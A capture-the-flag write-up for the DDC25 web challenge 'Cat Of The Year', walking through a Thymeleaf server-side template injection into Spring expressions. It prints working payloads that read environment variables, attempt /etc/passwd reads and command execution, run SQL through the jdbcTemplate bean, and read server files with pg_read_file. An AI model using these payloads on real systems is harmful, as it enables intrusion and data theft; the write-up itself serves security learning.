---
title: WEB - Cat Of The Year DDC25
published: 2025-09-26
description: This kind of SSTI challenge hides the flag too well, so I write this write-up just to store it and to find in need.
image: "./injection.png"
tags: [redteam, real-life, pentest, SSTI, SpEL]
category: Web Exploitation
draft: false
---

# Cat Of The Year

I dont think I will have a write up for this challenge cuz the organizers shut the server down too early but I am free right now, I have its source code and a draft of notes taken while doing this challenge. Though quite a few people solved this challenge, this kind of **SSTI** hides the flag too well, so I will write a write up for this web challenge:> 

Hope you guys enjoy it!!

<img width="1038" height="617" alt="image" src="https://github.com/user-attachments/assets/334fe054-0bfb-4e2a-893a-cf26dbb5b537" />

## Recon:

In file `../controller/CatController.java` , we have `GET /cat?name=<name>`, with `<name>` is untrusted data - controlled by attacker.

<img width="1235" height="575" alt="image 1" src="https://github.com/user-attachments/assets/59d0bb88-8d31-466b-994e-566aef694d34" />

- This is the important entrypoint. The name parameter is rendered in the template, and this page creates a `<form action="/rating?cat=<catName>"...>` to submit votes based on the `catName`.

In file `../templates/details.html` , I found [Thymeleaf’s preprocessing expressions](https://www.thymeleaf.org/doc/tutorials/2.1/usingthymeleaf.html) `__${...}__`, with untrusted data input that user can control, this can lead to a second evaluation pass. 

<img width="1007" height="458" alt="image 2" src="https://github.com/user-attachments/assets/624c5e3c-322c-43ee-b557-a9511a553569" />

I sent a payload like this `GET /cat?name=${7*7}` and I received `< form th:action="/rating?cat=49"...>`. So that I can confirm that this is **SSTI → SpEL execution**.

## Exploitation:

In the next step, I created a small helper to extract the evaluated value from the form action, make everything easy later.

**Create small helper:**

```python
# ex: send a payload to /cat?name=..., extract the value set into action="/rating?cat=..."
┌──(I3isk3t㉿kali)-[~]
└─$ ex() {
curl -sG "http://139.59.242.13:1337/cat" --data-urlencode "name=$1"
| awk -F'action="/rating\\?cat=' 'NF>1{split($2,a,"\"");print a[1]}'
| python3 -c 'import
sys,urllib.parse;print(urllib.parse.unquote(sys.stdin.read()))'
}
```

**Check if my small helper and SSTI works or not:**

```python
┌──(I3isk3t㉿kali)-[~]
└─$ ex '${{7*7}}'
49
```

Okay, will think after this part, everything will get easy, but NO, the point is I checked every single info leaked like environment and got nothing useful from it, I tried to read Java file, check if I could RCE and the challenge still say NO, maybe server has filter/sandbox.

**Checking environment bean:**

```python

┌──(I3isk3t㉿kali)-[~]
└─$ ex '${{@environment!=null?1:0}}'
1
┌──(I3isk3t㉿kali)-[~]
└─$ ex '${{@environment.getProperty("spring.application.name")}}'
coty
┌──(I3isk3t㉿kali)-[~]
└─$ ex '${{@environment.getSystemEnvironment()["PA"+"TH"]}}'
/usr/local/openjdk-17/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
# I checked others thing in ENV also, but nothing appears as an important information
```

**Reading Java file, checking RCE:**

```python
┌──(I3isk3t㉿kali)-[~]
└─$ ex '${ T(java.nio.file.Files).readString(... "/etc/passwd") }'
# NULL
┌──(I3isk3t㉿kali)-[~]
└─$ ex '${ T(java.lang.Runtime).getRuntime().exec("id") … }'
# NULL
```

**Pivot to the database via Spring beans:**

After the direct info leak route failed (`ENV` read and `T(java.*)` calls returned nothing). Maybe the **FLAG** is stored in DB. I pivoted to the database via Spring beans. I can reference **Spring-managed beans** directly in the expression context using the `@beanName` syntax. If the app wires a `JdbcTemplate`/`DataSource`, I can call it to run SQL from within the template expression—so your attack surface “pivots” from the view layer to the **database**.
[**JdbcTemplate**](https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/jdbc/core/JdbcTemplate.html) is common in Spring apps. It executes core JDBC workflow, leaving application code to provide **SQL** and extract results. I will check if I can use `JdbcTemplate`:

```python
┌──(I3isk3t㉿kali)-[~]
└─$ ex '${{@jdbcTemplate!=null?1:0}}'
1
┌──(I3isk3t㉿kali)-[~]
└─$ ex '${{@jdbcTemplate.queryForObject("select 7*7",T(java.lang.Integer))}}'
49
```

DB config disclosure:

```python
┌──(I3isk3t㉿kali)-[~]
└─$ ex '${{@environment.getProperty("spring.datasource.url")}}'
jdbc:postgresql://postgres:5432/coty_db
```

List schema & tables:

```python
┌──(I3isk3t㉿kali)-[~]
└─$ ex '${{@jdbcTemplate.queryForList("select table_name from information_schema.tables where table_schema=$$public$$ order by 1",T(java.lang.String)).toString()}}'
[cats, ratings]
```

- There is no table/field “flag”.

That’s why at first I said this kind of **SSTI** hides the flag too well.

Lateral read via PostgreSQL system functions:

Once I can run **SQL**, that mean I wont need to touch the web tier and pivot into the DB. Postgres will let me **list and read files on the DB server’s filesystem**.

List root FS from Postgres:

```python
┌──(I3isk3t㉿kali)-[~]
└─$ ex '${{@jdbcTemplate.queryForList("select * from pg_ls_dir($$/$$) order by 1",T(java.lang.String)).toString()}}'
[4546ab28d463c0d2-secret.txt, bin, boot, dev, docker-entrypoint-initdb.d, .dockerenv, etc, home, lib, lib64, media, mnt, opt, proc, root, run, sbin, srv, sys, tmp, usr, var]
```

Read files with `pg_read_file`:

[**pg_read_file**](https://pgpedia.info/p/pg_read_file.html) is a built-in Postgres function that returns the contents of a file **on the DB server’s filesystem.**

```python
┌──(I3isk3t㉿kali)-[~]
└─$ ex '${{@jdbcTemplate.queryForObject("select pg_read_file($$/4546ab28d463c0d2-secret.txt$$)", T(java.lang.String))}}'
DDC{spR1N9_3xpr3S1s0N_lan9UA93_1S_P0W3rFUL}
```
